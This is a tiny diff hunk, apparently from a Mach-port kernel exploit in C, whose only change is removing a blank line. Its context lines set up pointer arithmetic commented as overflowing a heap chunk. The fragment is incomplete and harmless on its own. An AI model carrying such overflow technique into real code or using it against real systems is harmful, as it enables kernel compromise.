@@ -62,7 +62,6 @@ mach_port_t find_port() {
     assert(fdata == odata + 0x4000);
     memset(odata, 0x42, 0x0);
     
-    
     mach_msg_type_number_t rsz = 0x100; // alloc size;
     fdata -= rsz + 0x100; // overflow full chunk
     
